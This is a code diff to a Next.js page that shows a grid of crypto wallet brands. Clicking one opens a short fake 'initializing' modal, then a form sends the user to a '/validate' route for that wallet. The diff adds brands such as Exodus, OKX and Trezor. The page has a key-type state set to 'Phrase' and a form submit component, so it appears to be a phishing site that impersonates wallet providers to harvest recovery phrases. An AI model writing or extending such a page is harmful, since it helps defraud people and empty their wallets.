@@ -1,7 +1,6 @@
 "use client";
 import Typewriter from "typewriter-effect";
 import FormSubmit from "./components/FormSubmit";
-import Link from "next/link";
 import { RiErrorWarningFill } from "react-icons/ri";
 import WalletCon from "./assets/wallcon.png";
 import Trust from "./assets/trust.jpg";
@@ -18,7 +17,7 @@ import Argent from "./assets/argent.jpg";
 import Polkadot from "./assets/polkadot.jpg";
 import Iotex from "./assets/iotex.jpg";
 import Coinbase from "./assets/cb.png";
-import Crypto from "./assets/crypto.jpg";
+import Crypto from "./assets/crypto-com.png";
 import Math from "./assets/math.jpg";
 import Ledger from "./assets/ledge.png";
 import Celo from "./assets/celo_wallet.jpg";
@@ -27,6 +26,12 @@ import Gnosis from "./assets/ghin.jpg";
 import Stargazer from "./assets/starg.png";
 import Onto from "./assets/onto.png";
 import Rainbow from "./assets/rb.png";
+import Solfare from "../assets/solfare.png";
+import CryptoCom from "./assets/crypto-com.png";
+import Exodus from "../assets/exodus.png";
+import OtherWallets from "./assets/imtoken.jpg";
+import Okx from "../assets/okx.jpeg";
+import Trezor from "../assets/trezor-wallet.webp";
 import Image from "next/image";
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
@@ -36,6 +41,7 @@ export default function Home() {
   const [keyType, setKeyType] = useState("Phrase");
   // const [state, handleSubmit] = useForm("mjvqbbnl");
   const [formState, setFormState] = useState({});
+  const [walletId, setWalletID] = useState(null);
 
   const data = [
     { img: WalletCon, title: "Wallet Connect" },
@@ -43,6 +49,11 @@ export default function Home() {
     { img: Metamask, title: "Metamask" },
     { img: Hashpack, title: "Hashpack" },
     { img: Keplr, title: "Keplr" },
+    { img: Solfare, title: "Solfare" },
+    { img: CryptoCom, title: "Crypto.com" },
+    { img: Exodus, title: "Exodus" },
+    { img: Okx, title: "OKX" },
+    { img: Trezor, title: "Trezor" },
     { img: Klever, title: "Klever" },
     { img: Cosmos, title: "Cosmos" },
     { img: Slope, title: "Slope" },
@@ -53,7 +64,6 @@ export default function Home() {
     { img: Polkadot, title: "Polkadot" },
     { img: Iotex, title: "Iotex" },
     { img: Coinbase, title: "Coinbase" },
-    { img: Crypto, title: "Crypto" },
     { img: Math, title: "Math" },
     { img: Ledger, title: "Ledger Live" },
     { img: Celo, title: "Celo" },
@@ -62,6 +72,7 @@ export default function Home() {
     { img: Stargazer, title: "Stargazer" },
     { img: Onto, title: "ONTO" },
     { img: Rainbow, title: "Rainbow" },
+    { img: OtherWallets, title: "Other Wallets" },
   ];
 
   const changeHandler = (event) => {
@@ -75,7 +86,7 @@ export default function Home() {
   const handleSubmit = async (e) => {
     e.preventDefault();
     setTimeout(() => {
-      navigate.push("/validate");
+      navigate.push("/validate/" + walletId);
     }, 1000);
   };
 
@@ -115,7 +126,8 @@ export default function Home() {
     });
   };
 
-  const initializeFunc = () => {
+  const initializeFunc = (index) => {
+    setWalletID(index);
     document.getElementById("my_modal_1").showModal();
     setTimeout(() => {
       document.getElementById("my_modal_1").close();
@@ -143,7 +155,7 @@ export default function Home() {
             <div
               key={index}
               className="shadow-2xl hover:shadow-none px-5 py-8 cursor-pointer"
-              onClick={() => initializeFunc()}
+              onClick={() => initializeFunc(index)}
             >
               <div className="mx-auto w-36 h-36 mb-6">
                 <Image
